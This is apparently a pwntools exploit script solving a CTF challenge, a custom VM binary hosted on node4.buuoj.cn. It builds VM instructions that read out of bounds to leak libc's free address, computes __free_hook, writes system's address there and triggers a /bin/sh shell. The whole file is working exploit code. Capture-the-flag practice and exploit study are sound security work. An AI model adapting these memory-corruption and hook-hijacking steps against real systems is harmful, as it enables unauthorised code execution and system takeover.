from pwn import *

#context.log_level = 'debug'

#p = process('./pwn')
p = remote('node4.buuoj.cn', 29445)
elf = ELF('pwn')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

def genCode(code, result, x1, x2):
	return ( code << 24 ) | (((( result << 8 ) | x1) << 8 ) | x2)

def genAdd(result, x1, x2):
	return genCode(0x70, result, x1, x2)

def genSub(result, x1, x2):
	return genCode(0x80, result, x1, x2)

def genSal(result, source, offset):
	return genCode(0xc0, result, source, offset)

def genSet(target, number):
	return genCode(0x10, target, 0, number)

def genLoad(result, offset):
	return genCode(0x30, result, 0, offset)

def genWrite(offset, source):
	return genCode(0x40, source, 0, offset)

def genShow():
	return genCode(0xff, 0, 0, 0)

mem_addr = 0x202060
fre_addr = 0x201F68
com_addr = 0x202040
reg_addr = 0x242060
#-0x3e = 0 - (  )
offset_free = -0x3e
offset_comm = -0x20

free_hook = libc.sym['__free_hook']
free_hook_to_free = libc.sym['__free_hook'] - libc.sym['free']

success('free_hook -> {}'.format(hex(libc.sym['__free_hook'])))

code = [
	#leak libc
	genSet(0xd, 0x3f), #r13 = 0x3f
	genSet(0xe, 1), #r14 = 0x1
	genSub(0xd, 0xe, 0xd), #r13 = r14 - r13 = -0x3e
	genLoad(0x1, 0xd), #r1 = (high)free
	genAdd(0xd, 0xd, 0xe), #r13 = r13 + r14 = -0x3d
	genLoad(0x2, 0xd), #r2 = (low)free
	
	#calculate free_hook
	#__start__set_ addr of free_hook to r3
	genSet(0x5, 0x8),
	genSet(0x3, free_hook_to_free & 0xff),
	genSet(0x4, (free_hook_to_free >> 8 ) & 0xff),
	genSal(0x4, 0x4, 0x5),
	genAdd(0x3, 0x3, 0x4),
	genSet(0x4, (free_hook_to_free >> 16 ) & 0xff),
	genSet(0x5, 16),
	genSal(0x4, 0x4, 0x5),
	genAdd(0x3, 0x3, 0x4), #r3 = free_hook
	#__end__set_
	
	#__start__set_ addr of free_hook - 8 to comment
	genAdd(0x1, 0x1, 0x3), #r3 = (low)real_free_hook, free + free_hook_to_free = free_hook
	genSet(0xd, 0x8),
	genSub(0x1, 0x1, 0xd), #r3 = (low)real_free_hook - 8
	genSet(0xd, 0x9), #r13 = 0x9
	genSet(0xe, 0x1), #r14 = 0x1
	genSub(0xd, 0xe, 0xd), #r13 = r14 - r13 = -0x8
	genWrite(0xd, 0x1), #(high)comment = r1 = (high)free - 8
	genAdd(0xd, 0xd, 0xe), #r13 = r13 + r14 = -0x7
	genWrite(0xd, 0x2), #(low)comment = r2 = (low)free - 8
	genShow(),
]

p.sendlineafter(b'PC: ', b'0')
p.sendlineafter(b'SP: ', b'0')
p.sendlineafter(b'CODE SIZE: ', str(len(code)).encode())

p.recvuntil(b'CODE: ')
#gdb.attach(p, 'b *$rebase(0x11b0)')

for i in code:
	sleep(0.1)
	p.sendline(str(i).encode())

p.recvuntil(b'R1: ')
real_free_hook = int(b'0x' + p.recv(8), 16) + 8
p.recvuntil(b'R2: ')
real_free_hook |= (int(b'0x' + p.recv(4), 16) << 32)
libc_base = real_free_hook - free_hook
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

p.sendlineafter(b' AT OVM?\n', b'/bin/sh\x00' + p64(system))

p.interactive()
